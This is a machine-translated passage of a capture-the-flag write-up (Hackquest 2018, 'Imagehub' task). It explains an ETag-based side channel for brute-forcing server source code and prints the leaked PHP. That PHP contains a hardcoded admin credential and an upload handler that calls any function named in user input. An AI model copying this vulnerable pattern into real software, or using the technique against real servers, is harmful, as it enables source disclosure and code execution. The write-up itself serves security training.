<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>📯 🗿 ☎️ Hackquest 2018. Ergebnisse & Zuschreibungen. Tag 4-7 🙆🏿 ✍🏿 📨</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Wie versprochen veröffentlichen wir den zweiten Teil der jährlichen Hackquest-Entscheidungen. Tag 4-7: Die Spannung steigt und die Aufgaben sind inter...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hackquest 2018. Ergebnisse & Zuschreibungen. Tag 4-7</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/440312/">  Wie versprochen veröffentlichen wir den zweiten Teil der jährlichen Hackquest-Entscheidungen.  Tag 4-7: Die Spannung steigt und die Aufgaben sind interessanter! <br><img src="https://habrastorage.org/webt/oa/br/8l/oabr8lkxzurvxgw-20o0jq23hgo.jpeg"><br><a name="habracut"></a><br><h2>  Inhalt: </h2><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Tag4.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Imagehub</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Tag 5.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Zeit</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Tag 6.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Super vm</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Tag7.</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Versteckte Ressource</a> </li></ul><br><img src="https://habrastorage.org/webt/xv/67/n9/xv67n9j_kw2fxrljp9zrrqewzxk.jpeg"><br><h2><a name="Imagehub"></a>  Tag4.  Imagehub </h2><br>  Diese Aufgabe wurde von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">SPbCTF</a> vorbereitet. <br><br>  <i>Unsere neue Kreation wird Instagram töten.</i>  <i>Wir werden Sie in nur zwei Worten überzeugen:</i> <i><br><br></i>  <i>1. Filter.</i>  <i>Neue nie zuvor gesehene Filter für Ihre hochgeladenen Bilder.</i> <i><br></i>  <i>2. Caching.</i>  <i>Der benutzerdefinierte HTTP-Server stellt sicher, dass Bilddateien im Browser-Cache landen.</i> <i><br><br></i>  <i>Probieren Sie es jetzt aus!</i>  <i>imagehub.spb.ctf.su</i> <i><br><br></i>  <i>Führen Sie / get_the_flag aus, um zu gewinnen.</i> <i><br></i>  <i>Benutzerdefinierte Server-Binärdatei: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">dppth</a></i> <br><br>  <b>Hinweise</b> <br>  <i><b>25.10.2008 20:00</b></i> <i><br></i>  <i>Aufgabe wurde nicht gelöst.</i>  <i>24 Stunden hinzugefügt.</i> <i><br><br></i>  <i><b>25.10.2008 17:00</b></i> <i><br></i>  <i>Es gibt zwei Fehler, die wir kennen.</i>  <i>Erstens erhalten Sie die Web-App-Quellen, zweitens erhalten Sie RCE.</i> <br><br><h4>  Übersicht: </h4><br>  Ausführbar: <br><br><ul><li>  ELF x86_64 </li><li>  Implementiert einen einfachen http-Server </li><li>  Wenn die angeforderte Datei ein ausführbares Bit hat, wird es an php-fpm übergeben </li><li>  Code implementiert benutzerdefiniertes Etag-Caching </li></ul><br>  Webpart: <br><br><ul><li>  Verfügt über eine Funktion zum Hochladen von Dateien.  Das Bild kann mit vordefinierten Filtern geändert werden. </li><li>  Admin-Seite mit Basic on /? Admin = show </li></ul><br><h4>  Sicherheitslücke: Lesen des Quellcodes </h4><br>  Die Cache-Funktionalität scheint interessant zu sein, da wir den Server dazu bringen können, einen beliebigen Dateibereich (sogar einen 1-Byte-Bereich) zu hashen. <br><br> <code>Etag = sprintf("%08x%08x%08x", file_mtime, hash, file_size);</code> <br> <div class="spoiler">  <b class="spoiler_title">Hash_Funktion:</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">etag_hash</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span><span class="hljs-function">:</span></span> v16 = [<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">16</span></span>)] v16[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span> v16[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0x1DB71064</span></span> v16[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0x3B6E20C8</span></span> v16[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0x26D930AC</span></span> v16[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0x76DC4190</span></span> v16[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0x6B6B51F4</span></span> v16[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0x4DB26158</span></span> v16[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0x5005713C</span></span> v16[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0xEDB88320</span></span> v16[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0xF00F9344</span></span> v16[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0xD6D6A3E8</span></span> v16[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0xCB61B38C</span></span> v16[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0x9B64C2B0</span></span> v16[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0x86D3D2D4</span></span> v16[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0xA00AE278</span></span> v16[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0xBDBDF21C</span></span> hash = <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(len(data)): v5 = ((hash &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[(hash ^ data[i]) &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span>]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> hash = ((v5 &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) ^ v16[v5 &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span> ^ (data[i] &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>)]) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (~hash) &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff</span></span></code> </pre> <br></div></div><br>  Leider ist etag für ausführbare Dateien (* .php) entfernt: <br><br><pre> <code class="plaintext hljs">stat_0(v2, &amp;stat_buf); if ( stat_buf.st_mode &amp; S_IEXEC ) { setHeader(a2-&gt;respo, "cache-control", "no-store"); deleteHeade(a2-&gt;respo, "etag"); set_environment_info(a1); dup2(fd, 0); snprintf(s, 4096, "/usr/bin/php-cgi %s", a1-&gt;url);</code> </pre> <br>  Vor der Seitenausführung wird noch eine Überprüfung durchgeführt. Wenn wir also den etag-Wert richtig erraten ( <b>falls keine Übereinstimmung</b> vorliegt), wird der Server eine Statusantwort von <b>304 Not Modified</b> senden.  Auf diese Weise können wir den Quellcode byteweise bruteforce. <br><br><pre> <code class="plaintext hljs">v11 = getHeader(&amp;s.request, "if-modified-since"); if ( v11 ) { v3 = getHeader(&amp;v14, "last-modified"); if ( !strcmp(v11, v3) ) send_status(304); } v12 = getHeader(&amp;s.request, "if-none-match"); if ( v12 ) { v4 = getHeader(&amp;v14, "etag"); if ( !strcmp(v12, v4) ) send_status(304); } exec_and_prepare_response_body(&amp;s, &amp;a2a);</code> </pre> <br>  Fassen wir zusammen, was wir von RE bekommen haben: <br><br><ol><li>  Der Zeitstempel kann leicht aus dem zuletzt geänderten Antwortheader (Zeichenfolge -&gt; Zeitstempel) gelesen werden. </li><li>  Der Bereich darf eine Bytelänge betragen (wir erhalten also nur Hash für ein Byte). </li><li>  Hash kann für einen 1-Byte-Bereich erraten werden (256 mögliche Werte) </li><li>  Die Größe ist brutal erzwingbar, aber wir müssen mindestens ein Byte aus der Zieldatei kennen. </li><li>  Da wir eine Quelle für * .php-Dateien erhalten möchten, ist es eine gute Annahme, dass die Datei mit "&lt;? Php" beginnt. </li></ol><br>  Der erste Schritt besteht darin, die Größe zu ermitteln, und der zweite darin, den tatsächlichen Dateiinhalt abzurufen. <br>  Mit Multithread-Code erreichte ich die Geschwindigkeit von ~ 1 Zeichen / Sek. Und gab einige Dateien aus: <br><div class="spoiler">  <b class="spoiler_title">index.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">// error_reporting(0); if (isset($_GET["admin"]) &amp;&amp; (!isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW'] !== '888b2f04eef9a49fc87fa81089b736de')) { header('WWW-Authenticate: Basic realm="Admin Area"'); header('HTTP/1.0 401 Unauthorized'); } require "upload.php"; $uploader = new ImageUploader(); $result = $uploader-&gt;upload(); if ($result === true) die(); if ($result &gt; 0) { echo "Error: " . $result; } if ($uploader-&gt;upload() !== true) { include "templates/main.php"; }</span></span></code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">upload.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/uploaderror.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/verify.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">"includes/filters.php"</span></span>; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ImageUploader</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> TARGET_DIR = <span class="hljs-string"><span class="hljs-string">"51a8ae2cab09c6b728919fe09af57ded/"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">upload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $result = verify_parameters(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($result !== <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $result; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!move_uploaded_file($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>], $target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::MOVE_ERROR; } $text = $_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]; $filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text); $imagick = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> \Imagick(realpath($target_file)); $imagick-&gt;scaleimage($size, $size); $imagick-&gt;setImageOpacity(<span class="hljs-number"><span class="hljs-number">0.5</span></span>); $imagick-&gt;compositeImage($filterImage, imagick::CHANNEL_ALPHA, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); header(<span class="hljs-string"><span class="hljs-string">"Content-Type: image/jpeg"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $imagick-&gt;getImageBlob(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } }</code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">enthält / filter.php</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">make_text</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($image, $size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $draw = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickDraw(); $draw-&gt;setFillColor(<span class="hljs-string"><span class="hljs-string">'white'</span></span>); $draw-&gt;setFontSize( <span class="hljs-number"><span class="hljs-number">18</span></span> ); $image-&gt;annotateImage($draw, $size / <span class="hljs-number"><span class="hljs-number">2</span></span> - <span class="hljs-number"><span class="hljs-number">65</span></span>, $size - <span class="hljs-number"><span class="hljs-number">20</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, $text); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">futut</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">incasinato</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(130,100,255,3)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">fertocht</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $s = $size % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">"rgba($s,$s,$s,127)"</span></span> ); $image-&gt;newImage($size, $size, $pixel); $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">jebeno</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(0,255,255,255)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i*<span class="hljs-number"><span class="hljs-number">10</span></span>) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-($size-$j)) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">kuthamanga</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($size, $text)</span></span></span><span class="hljs-function"> </span></span>{ $image = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Imagick(); $pixel = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ImagickPixel( <span class="hljs-string"><span class="hljs-string">'rgba(127,127,127,127)'</span></span> ); $image-&gt;newImage($size, $size, $pixel); $iterator = $image-&gt;getPixelIterator(); $i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($iterator <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $row=&gt;$pixels) { $i++; $j=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ( $pixels <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $col=&gt;$pixel ) { $j++; $color = $pixel-&gt;getColor(); $alpha = $pixel-&gt;getColor(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); $r = ($color[<span class="hljs-string"><span class="hljs-string">'r'</span></span>]+$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $g = ($color[<span class="hljs-string"><span class="hljs-string">'g'</span></span>]-$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $b = ($color[<span class="hljs-string"><span class="hljs-string">'b'</span></span>]-$i) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $a = ($alpha[<span class="hljs-string"><span class="hljs-string">'a'</span></span>]+$j) % <span class="hljs-number"><span class="hljs-number">255</span></span>; $pixel-&gt;setColor(<span class="hljs-string"><span class="hljs-string">"rgba($r,$g,$b,$a)"</span></span>); } $iterator-&gt;syncIterator(); } $image = make_text($image, $size, $text); $image-&gt;setImageFormat(<span class="hljs-string"><span class="hljs-string">'png'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $image; }</code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">enthält / uploaderror.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UploadError</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> POST_SUBMIT = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> IMAGE_NOT_FOUND = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> NOT_IMAGE = <span class="hljs-number"><span class="hljs-number">2</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> FILE_EXISTS = <span class="hljs-number"><span class="hljs-number">3</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> BIG_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_EXTENSION = <span class="hljs-number"><span class="hljs-number">5</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_MIMETYPE = <span class="hljs-number"><span class="hljs-number">6</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INVALID_PARAMS = <span class="hljs-number"><span class="hljs-number">7</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> INCORRECT_SIZE = <span class="hljs-number"><span class="hljs-number">8</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> MOVE_ERROR = <span class="hljs-number"><span class="hljs-number">9</span></span>; }</code> </pre> <br></div></div><br><div class="spoiler">  <b class="spoiler_title">enthält / verify.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">verify_parameters</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'submit'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::POST_SUBMIT; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_FILES[<span class="hljs-string"><span class="hljs-string">'imageFile'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::IMAGE_NOT_FOUND; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $imageFileType = strtolower(pathinfo($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>], PATHINFO_EXTENSION)); $imageFileInfo = getimagesize($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($imageFileInfo === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::NOT_IMAGE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"size"</span></span>] &gt; <span class="hljs-number"><span class="hljs-number">1024</span></span>*<span class="hljs-number"><span class="hljs-number">32</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::BIG_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!in_array($imageFileType, [<span class="hljs-string"><span class="hljs-string">'jpg'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_EXTENSION; } $imageMimeType = $imageFileInfo[<span class="hljs-string"><span class="hljs-string">'mime'</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($imageMimeType !== <span class="hljs-string"><span class="hljs-string">'image/jpeg'</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_MIMETYPE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (file_exists($target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::FILE_EXISTS; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INVALID_PARAMS; } $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (($size &lt;= <span class="hljs-number"><span class="hljs-number">0</span></span>) || ($size &gt; <span class="hljs-number"><span class="hljs-number">512</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; }</code> </pre> <br></div></div><br>  Dies gibt uns: <br><ul><li>  Benutzername / Passwort für Admin Basic.  Völlig nutzlos, druckt es nur Zeichenfolge: <br>  